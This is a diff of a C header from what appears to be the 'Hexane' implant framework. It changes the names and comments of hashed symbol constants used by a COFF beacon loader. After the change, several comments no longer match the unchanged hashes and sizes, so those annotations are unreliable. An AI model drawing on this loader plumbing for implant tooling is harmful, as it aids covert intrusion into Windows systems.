@@ -74,11 +74,11 @@ EXTERN_C LPVOID InstEnd();
 	#define IMAGE_OPT_MAGIC 					IMAGE_NT_OPTIONAL_HDR64_MAGIC
 	#define MACHINE_ARCH    					IMAGE_FILE_MACHINE_AMD64
 // set these dynamically?
-	#define COFF_PREP_SYMBOL        			0xec6ba2a8 	// __imp_
+	#define COFF_PREP_SYMBOL        			0xec6ba2a8 	// __win32_
 	#define COFF_PREP_SYMBOL_SIZE   			6
-	#define COFF_PREP_BEACON        			0xd0a409b0  // __imp_Hexane
+	#define COFF_PREP_BEACON        			0xd0a409b0  // __Hexane
 	#define COFF_PREP_BEACON_SIZE   			(COFF_PREP_SYMBOL_SIZE + 6)
-	#define COFF_INSTANCE           			0xbfded9c9  // .refptr._instance
+	#define GLOBAL_CONTEXT           			0xbfded9c9  // .refptr._instance
 #elif _M_IX86
 	#define ENTRYPOINT_REG 						Eax
 	#define PTR_MASK                    		0x7FFF
@@ -88,11 +88,11 @@ EXTERN_C LPVOID InstEnd();
 	#define IMAGE_OPT_MAGIC 					IMAGE_NT_OPTIONAL_HDR32_MAGIC
 	#define MACHINE_ARCH    					IMAGE_FILE_MACHINE_I386
 // set these dynamically?
-    #define COFF_PREP_SYMBOL        			0x79dff807	// __imp__
+    #define COFF_PREP_SYMBOL        			0x79dff807	// __win32__
     #define COFF_PREP_SYMBOL_SIZE   			7
-    #define COFF_PREP_BEACON        			0x4c20aa4f	// __imp__Hexane
+    #define COFF_PREP_BEACON        			0x4c20aa4f	// __Hexane
     #define COFF_PREP_BEACON_SIZE   			(COFF_PREP_SYMBOL_SIZE + 6)
-    #define COFF_INSTANCE           			0xb341b5b9	// _instance
+    #define GLOBAL_CONTEXT           			0xb341b5b9	// _instance
 #endif
 
 #define HEAP_NO_COMMIT							0, 0, 0, 0, 0
